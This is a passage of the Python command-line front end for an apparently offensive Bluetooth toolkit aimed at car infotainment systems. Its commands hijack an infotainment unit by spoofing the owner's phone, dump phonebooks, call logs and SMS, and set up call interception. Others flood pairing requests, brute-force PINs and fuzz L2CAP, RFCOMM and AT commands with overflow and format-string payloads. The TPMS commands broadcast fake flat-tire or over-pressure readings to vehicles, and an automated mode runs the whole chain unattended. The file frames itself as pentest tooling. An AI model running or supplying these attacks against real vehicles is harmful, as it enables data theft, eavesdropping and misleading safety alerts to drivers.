        _save_json(findings, output)


# ============================================================================
# HIJACK - Full Attack Chain
# ============================================================================
@main.command()
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output-dir", default="hijack_output")
@click.option("--recon-only", is_flag=True, help="Only run reconnaissance phase")
@click.option("--skip-audio", is_flag=True, help="Skip audio setup phase")
def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
           recon_only, skip_audio):
    """Full IVI hijack: spoof phone identity and extract data.

    \b
    IVI_ADDRESS:   Target IVI Bluetooth address
    PHONE_ADDRESS: Phone MAC to impersonate

    \b
    Attack phases:
      1. Recon      - Fingerprint IVI, discover services
      2. Impersonate - Spoof MAC + name + device class
      3. Connect     - Connect to IVI as spoofed phone
      4a. PBAP      - Download phonebook & call logs
      4b. MAP       - Download SMS/MMS messages
      5. Audio      - Setup HFP for call interception
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from bt_tap.attack.hijack import HijackSession

    verbose(f"Starting hijack session: IVI={ivi_address} Phone={phone_address}")
    session = HijackSession(
        ivi_address=ivi_address,
        phone_address=phone_address,
        phone_name=phone_name,
        hci=hci,
        output_dir=output_dir,
    )

    try:
        if recon_only:
            session.recon()
        else:
            results = session.run_full_attack()
            # Save results
            os.makedirs(output_dir, exist_ok=True)
            results_file = os.path.join(output_dir, "attack_results.json")
            _save_json(results, results_file)
    except KeyboardInterrupt:
        warning("\nInterrupted by user")
    finally:
        session.cleanup()


# ============================================================================
# AVRCP - Media Control
# ============================================================================
@main.group()
def avrcp():
    """AVRCP media control and attacks."""


@avrcp.command("play")
@click.argument("address", required=False, default=None)
def avrcp_play(address):
    """Send play command."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.play()


@avrcp.command("pause")
@click.argument("address", required=False, default=None)
def avrcp_pause(address):
    """Send pause command."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.pause()


@avrcp.command("stop")
@click.argument("address", required=False, default=None)
def avrcp_stop(address):
    """Send stop command."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.stop()


@avrcp.command("next")
@click.argument("address", required=False, default=None)
def avrcp_next(address):
    """Skip to next track."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.next_track()


@avrcp.command("prev")
@click.argument("address", required=False, default=None)
def avrcp_prev(address):
    """Skip to previous track."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.previous_track()


@avrcp.command("volume")
@click.argument("address", required=False, default=None)
@click.argument("level", type=int)
def avrcp_volume(address, level):
    """Set volume (0-127)."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.set_volume(level)


@avrcp.command("volume-ramp")
@click.argument("address", required=False, default=None)
@click.option("--start", default=0, help="Start volume")
@click.option("--end", default=127, help="End volume")
@click.option("--step-ms", default=100, help="Delay between steps (ms)")
def avrcp_volume_ramp(address, start, end, step_ms):
    """Gradually ramp volume (escalation attack)."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.volume_ramp(start=start, target=end, step_ms=step_ms)


@avrcp.command("skip-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=100, help="Number of skip commands")
@click.option("--interval", default=0.1, help="Interval between skips (seconds)")
def avrcp_skip_flood(address, count, interval):
    """Rapid track skip injection."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        ctrl.skip_flood(count, int(interval * 1000))


@avrcp.command("metadata")
@click.argument("address", required=False, default=None)
def avrcp_metadata(address):
    """Show current track metadata."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        track = ctrl.get_track_info()
        status = ctrl.get_status()
        console.print(f"[bold cyan]Status:[/bold cyan] {status}")
        if track:
            for key, val in track.items():
                console.print(f"  [cyan]{key}:[/cyan] {val}")
        else:
            warning("No track info available")


@avrcp.command("monitor")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=300, help="Monitor duration (seconds)")
def avrcp_monitor(address, duration):
    """Monitor track changes in real-time."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.avrcp import AVRCPController
    ctrl = AVRCPController(address)
    if ctrl.connect():
        def on_change(changed):
            if isinstance(changed, dict):
                # May receive full props dict or just track dict
                if "Track" in changed:
                    track = changed["Track"]
                    console.print(f"[green]Track changed:[/green] "
                                  f"{track.get('Artist', '?')} - {track.get('Title', '?')}")
                elif "Title" in changed or "Artist" in changed:
                    console.print(f"[green]Track changed:[/green] "
                                  f"{changed.get('Artist', '?')} - {changed.get('Title', '?')}")
                if "Status" in changed:
                    console.print(f"[yellow]Status:[/yellow] {changed['Status']}")

        ctrl.monitor_metadata(duration, callback=on_change)


# ============================================================================
# DOS - Denial of Service & Pairing Attacks
# ============================================================================
@main.group()
def dos():
    """DoS attacks and pairing abuse."""


@dos.command("pair-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=50, help="Number of pairing attempts")
@click.option("--interval", default=0.5, help="Delay between attempts (seconds)")
def dos_pair_flood(address, count, interval):
    """Flood target with pairing requests."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.flood_pairing_requests(count, interval)
    console.print(f"[bold]Results:[/bold] {result}")


@dos.command("name-flood")
@click.argument("address", required=False, default=None)
@click.option("--length", default=248, help="Device name length")
def dos_name_flood(address, length):
    """Pair with max-length device names (memory exhaustion)."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.long_name_flood(length)
    console.print(f"[bold]Results:[/bold] {result}")


@dos.command("rate-test")
@click.argument("address", required=False, default=None)
def dos_rate_test(address):
    """Detect rate limiting on pairing attempts."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.detect_rate_limiting()

    if result.get("rate_limited"):
        warning("Rate limiting detected!")
    else:
        success("No rate limiting detected")
    for k, v in result.items():
        info(f"  {k}: {v}")


@dos.command("pin-brute")
@click.argument("address", required=False, default=None)
@click.option("--start", default=0, help="Start PIN")
@click.option("--end", default=9999, help="End PIN")
@click.option("--delay", default=0.5, help="Delay between attempts")
def dos_pin_brute(address, start, end, delay):
    """Brute-force legacy PIN pairing."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.pin_brute import PINBruteForce
    bf = PINBruteForce(address)
    pin = bf.brute_force(start, end, delay)
    if pin:
        success(f"PIN found: {pin}")
    else:
        warning("PIN not found in range")


# ============================================================================
# TPMS - Tire Pressure Monitoring System BLE Attacks
# ============================================================================
@main.group()
def tpms():
    """TPMS sensor attacks (scan, sniff, spoof, flood, SDR capture).

    \b
    Target BLE-based TPMS sensors that broadcast tire pressure,
    temperature, and battery data. TPMS sensors are BLE peripherals
    that advertise — the vehicle ECU listens passively.

    Also supports 315/433 MHz traditional TPMS via rtl_433 + SDR.
    """


@tpms.command("scan")
@click.option("-d", "--duration", default=15, help="Scan duration (seconds)")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
def tpms_scan(duration, hci):
    """Scan for BLE TPMS sensors nearby.

    \b
    Identifies TPMS sensors by name patterns, service UUIDs,
    and manufacturer data analysis.
    """
    from bt_tap.attack.tpms import TPMSScanner
    scanner = TPMSScanner(hci)
    sensors = scanner.scan(duration)
    if sensors:
        summary_panel("TPMS Scan Results", {
            "Sensors Found": str(len(sensors)),
            "Positions": ", ".join(s.position for s in sensors),
        })


@tpms.command("sniff")
@click.option("-d", "--duration", default=60, help="Sniff duration (seconds)")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default="tpms_capture", help="Output directory")
@click.option("--nrf", is_flag=True, help="Use nRF52840 Sniffer for enhanced capture")
def tpms_sniff(duration, hci, output, nrf):
    """Sniff BLE TPMS advertisements in real-time.

    \b
    Monitors TPMS sensor advertisements and logs pressure, temperature,
    battery readings. Supports nRF52840 dongle for enhanced capture.

    Examples:
      bt-tap tpms sniff                     # 60s standard BLE sniff
      bt-tap tpms sniff -d 300 --nrf        # 5min with nRF52840
      bt-tap tpms sniff -o ./captures       # Custom output directory
    """
    from bt_tap.attack.tpms import TPMSSniffer
    sniffer = TPMSSniffer(hci, output)
    sniffer.sniff(duration, use_nrf=nrf)


@tpms.command("decode")
@click.argument("data")
@click.option("-a", "--address", default="00:00:00:00:00:00", help="Source sensor address")
@click.option("-f", "--file", "log_file", default=None, help="HCI log file to parse")
def tpms_decode(data, address, log_file):
    """Decode TPMS data from raw hex or HCI log file.

    \b
    DATA is a hex string of the TPMS advertisement payload,
    or use --file to parse an entire btmon/HCI capture log.

    Examples:
      bt-tap tpms decode "01c80a4150"             # Decode raw hex
      bt-tap tpms decode - --file capture.log      # Parse HCI log
    """
    from bt_tap.attack.tpms import TPMSDecoder
    decoder = TPMSDecoder()

    if log_file:
        readings = decoder.decode_hci_log(log_file)
        if readings:
            decoder.analyze(readings)
    else:
        reading = decoder.decode_raw(data, address)
        if reading:
            result_box("Decoded TPMS Reading", (
                f"Pressure: {reading.pressure_psi:.1f} PSI ({reading.pressure_kpa:.1f} kPa)\n"
                f"Temperature: {reading.temperature_c:.1f}C ({reading.temperature_f:.1f}F)\n"
                f"Battery: {reading.battery_pct}%"
            ))


@tpms.command("spoof")
@click.option("-p", "--pressure", default=32.0, type=float, help="Pressure in PSI")
@click.option("-t", "--temp", default=25.0, type=float, help="Temperature in Celsius")
@click.option("-b", "--battery", default=80, type=int, help="Battery percentage")
@click.option("--position", default=1, type=click.IntRange(1, 5),
              help="Tire position: 1=FL, 2=FR, 3=RL, 4=RR, 5=Spare")
@click.option("-c", "--count", default=100, help="Number of advertisements")
@click.option("--interval", default=100, type=int, help="Interval in ms")
@click.option("-i", "--hci", default="hci0")
def tpms_spoof(pressure, temp, battery, position, count, interval, hci):
    """Impersonate a TPMS sensor with fake readings.

    \b
    Broadcasts crafted BLE advertisements mimicking a TPMS sensor
    to inject fake pressure/temperature data into the vehicle ECU.
    Aftermarket BLE TPMS has zero authentication — any transmitter
    can broadcast matching advertisements.

    Examples:
      bt-tap tpms spoof --pressure 0 --position 1       # Flat tire FL
      bt-tap tpms spoof --pressure 65 --temp 90          # Over-pressure + hot
      bt-tap tpms spoof -p 28 -c 500 --interval 50      # Sustained low pressure
    """
    from bt_tap.attack.tpms import TPMSSpoofer
    spoofer = TPMSSpoofer(hci)
    spoofer.spoof_reading(
        pressure_psi=pressure,
        temperature_c=temp,
        battery_pct=battery,
        position=position,
        count=count,
        interval_ms=interval,
    )


@tpms.command("flat-tire")
@click.option("--position", default=1, type=click.IntRange(1, 5),
              help="Tire position: 1=FL, 2=FR, 3=RL, 4=RR, 5=Spare")
@click.option("-c", "--count", default=200, help="Number of advertisements")
@click.option("-i", "--hci", default="hci0")
def tpms_flat_tire(position, count, hci):
    """Spoof flat tire (0 PSI) to trigger IVI low-pressure alert.

    \b
    Quick shortcut to send 0 PSI readings for a specific tire position.
    """
    from bt_tap.attack.tpms import TPMSSpoofer
    spoofer = TPMSSpoofer(hci)
    spoofer.spoof_flat_tire(position=position, count=count)


@tpms.command("over-pressure")
@click.option("--position", default=1, type=click.IntRange(1, 5),
              help="Tire position: 1=FL, 2=FR, 3=RL, 4=RR, 5=Spare")
@click.option("-c", "--count", default=200, help="Number of advertisements")
@click.option("-i", "--hci", default="hci0")
def tpms_over_pressure(position, count, hci):
    """Spoof dangerous over-pressure (65 PSI) to trigger IVI alert."""
    from bt_tap.attack.tpms import TPMSSpoofer
    spoofer = TPMSSpoofer(hci)
    spoofer.spoof_over_pressure(position=position, count=count)


@tpms.command("flood")
@click.option("-d", "--duration", default=30, help="Flood duration (seconds)")
@click.option("--interval", default=20, type=int, help="Interval in ms")
@click.option("--mode", default="random",
              type=click.Choice(["random", "sweep"]),
              help="Flood mode: random values or pressure sweep")
@click.option("--position", default=1, type=click.IntRange(1, 5),
              help="Tire position for sweep mode")
@click.option("-i", "--hci", default="hci0")
def tpms_flood(duration, interval, mode, position, hci):
    """Flood BLE TPMS advertisements to overwhelm IVI receiver.

    \b
    Modes:
      random  - Rapid random pressure/temp values across all positions
      sweep   - Sawtooth pressure sweep on a single tire position

    Examples:
      bt-tap tpms flood -d 60 --mode random         # 60s random flood
      bt-tap tpms flood --mode sweep --position 2    # Sweep FR tire
    """
    from bt_tap.attack.tpms import TPMSFlood
    flood = TPMSFlood(hci)
    if mode == "sweep":
        flood.flood_pressure_sweep(duration, position)
    else:
        flood.flood_random(duration, interval)


@tpms.command("sdr")
@click.option("-d", "--duration", default=60, help="Capture duration (seconds)")
@click.option("-f", "--freq", default="auto",
              help="Frequency: 315M, 433.92M, or auto (hop both)")
@click.option("--device", default="", help="SDR device string (e.g., driver=uhd for B210)")
@click.option("-o", "--output", default="tpms_capture", help="Output directory")
def tpms_sdr(duration, freq, device, output):
    """Capture traditional 315/433 MHz TPMS via SDR + rtl_433.

    \b
    Traditional TPMS sensors use 315 MHz (NA/Japan) or 433.92 MHz (EU)
    RF, NOT Bluetooth. This uses rtl_433 to decode them.

    Zero encryption, zero authentication. Sensor IDs are immutable
    32-bit values that also enable vehicle tracking.

    Requires: rtl_433 + RTL-SDR dongle, HackRF, or USRP B210.

    Examples:
      bt-tap tpms sdr                           # Auto-hop 315M + 433.92M
      bt-tap tpms sdr -f 433.92M -d 120         # EU frequency, 2 minutes
      bt-tap tpms sdr --device "driver=uhd"      # Use USRP B210
    """
    from bt_tap.attack.tpms import TPMSSDRCapture
    sdr = TPMSSDRCapture(output)
    sdr.capture(duration, freq, device=device)


@tpms.command("sdr-protocols")
def tpms_sdr_protocols():
    """List rtl_433 TPMS-related decoder protocols."""
    from bt_tap.attack.tpms import TPMSSDRCapture
    sdr = TPMSSDRCapture()
    sdr.list_protocols()


@tpms.command("capture-start")
@click.option("-o", "--output", default="tpms_capture", help="Output directory")
@click.option("-f", "--file", "filename", default="tpms_hci.log", help="Capture filename")
def tpms_capture_start(output, filename):
    """Start HCI-level BLE capture for deep TPMS analysis.

    \b
    Launches btmon in background to capture all BLE advertisement PDUs.
    Use 'tpms capture-stop' to end capture, then 'tpms decode --file'
    to analyze.
    """
    from bt_tap.attack.tpms import TPMSHCICapture
    capture = TPMSHCICapture(output)
    path = capture.start(filename)
    if path:
        info("Use 'bt-tap tpms capture-stop' to end capture")
        info(f"Then 'bt-tap tpms decode - --file {path}' to analyze")


@tpms.command("capture-stop")
def tpms_capture_stop():
    """Stop running HCI capture."""
    # Find and kill btmon process
    result = run_cmd(["pgrep", "-f", "btmon.*tpms"], timeout=5)
    if result.returncode == 0 and result.stdout.strip():
        for pid in result.stdout.strip().split("\n"):
            pid = pid.strip()
            if pid:
                run_cmd(["kill", pid], timeout=5)
                success(f"Stopped btmon (PID: {pid})")
    else:
        warning("No TPMS btmon capture running")


# ============================================================================
# FUZZ - Protocol Fuzzing
# ============================================================================
@main.group()
def fuzz():
    """Protocol fuzzing (L2CAP, RFCOMM, AT commands)."""


@fuzz.command("l2cap")
@click.argument("address", required=False, default=None)
@click.option("--psm", default=1, help="L2CAP PSM to fuzz")
@click.option("--count", default=100, help="Number of packets")
@click.option("--mode", default="malformed",
              type=click.Choice(["oversized", "malformed", "null"]))
def fuzz_l2cap(address, psm, count, mode):
    """Fuzz L2CAP protocol."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.fuzz import L2CAPFuzzer
    fuzzer = L2CAPFuzzer(address)
    if mode == "oversized":
        result = fuzzer.oversized_mtu(psm)
    elif mode == "null":
        result = fuzzer.null_flood(psm, count)
    else:
        result = fuzzer.malformed_packets(psm, count)
    console.print(f"[bold]Fuzz results:[/bold] {result}")


@fuzz.command("rfcomm")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=1, help="RFCOMM channel")
@click.option("--mode", default="exhaust",
              type=click.Choice(["exhaust", "overflow", "at"]))
def fuzz_rfcomm(address, channel, mode):
    """Fuzz RFCOMM protocol."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.fuzz import RFCOMMFuzzer
    fuzzer = RFCOMMFuzzer(address)
    if mode == "exhaust":
        result = fuzzer.channel_exhaustion()
    elif mode == "overflow":
        result = fuzzer.large_payload(channel)
    else:
        result = fuzzer.at_fuzz(channel)
    console.print(f"[bold]Fuzz results:[/bold] {result}")


@fuzz.command("at")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=1, help="RFCOMM channel")
@click.option("--patterns", default="long,null,format,unicode,overflow",
              help="Comma-separated: long,null,format,unicode,overflow")
def fuzz_at(address, channel, patterns):
    """AT command fuzzing with malformed inputs."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.fuzz import RFCOMMFuzzer

    # Map keyword names to actual fuzz patterns
    pattern_map = {
        "long": "AT" + "A" * 1024 + "\r\n",
        "null": "AT\x00\x00\r\n",
        "format": "AT%n%n%x%x\r\n",
        "unicode": "AT" + "\u00c4" * 256 + "\r\n",
        "overflow": "AT+" + "B" * 512 + "\r\n",
    }
    pattern_list = []
    for name in patterns.split(","):
        name = name.strip()
        if name in pattern_map:
            pattern_list.append(pattern_map[name])
        else:
            pattern_list.append(name)  # Allow raw patterns too

    fuzzer = RFCOMMFuzzer(address)
    result = fuzzer.at_fuzz(channel, pattern_list)
    console.print(f"[bold]AT fuzz results:[/bold] {result}")


@fuzz.command("bss")
@click.argument("address", required=False, default=None)
def fuzz_bss(address):
    """Run Bluetooth Stack Smasher (external tool)."""
    address = resolve_address(address)
    if not address:
        return
    from bt_tap.attack.fuzz import bss_wrapper
    if not bss_wrapper(address):
        error("BSS not available or failed")


# ============================================================================
# REPORT - Pentest Report Generation
# ============================================================================
@main.command("report")
@click.argument("dump_dir")
@click.option("-f", "--format", "fmt", default="html",
              type=click.Choice(["html", "json"]))
@click.option("-o", "--output", default=None, help="Output file")
def report_cmd(dump_dir, fmt, output):
    """Generate pentest report from attack output directory."""
    from bt_tap.report.generator import ReportGenerator

    report = ReportGenerator()
    report.load_from_directory(dump_dir)

    if fmt == "html":
        out = output or os.path.join(dump_dir, "report.html")
        report.generate_html(out)
    else:
        out = output or os.path.join(dump_dir, "report.json")
        report.generate_json(out)


# ============================================================================
# AUTO - Automated Discovery and Attack
# ============================================================================
@main.command("auto")
@click.argument("ivi_mac", required=False, default=None)
@click.option("-d", "--duration", default=60, help="Scan duration (seconds)")
@click.option("-o", "--output", default="auto_output", help="Output directory")
@click.option("-i", "--hci", default="hci0")
def auto_cmd(ivi_mac, duration, output, hci):
    """Automated: discover phone, hijack IVI, dump data, report.

    \b
    Scans for phones near the target IVI, identifies the paired phone,
    then runs the full hijack chain automatically.
    """
    ivi_mac = resolve_address(ivi_mac, prompt="Select TARGET IVI")
    if not ivi_mac:
        return
    from bt_tap.attack.auto import AutoDiscovery

    auto = AutoDiscovery(ivi_mac, hci=hci)
    try:
        results = auto.run_auto(output_dir=output, scan_duration=duration)
        # Save results
        os.makedirs(output, exist_ok=True)
        _save_json(results, os.path.join(output, "auto_results.json"))
    except KeyboardInterrupt:
        warning("\nInterrupted by user")


# ============================================================================
# UTILITIES
# ============================================================================
def _save_json(data, filepath):
    """Save data to JSON file."""
    os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else ".", exist_ok=True)
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {filepath}")


if __name__ == "__main__":
    main()
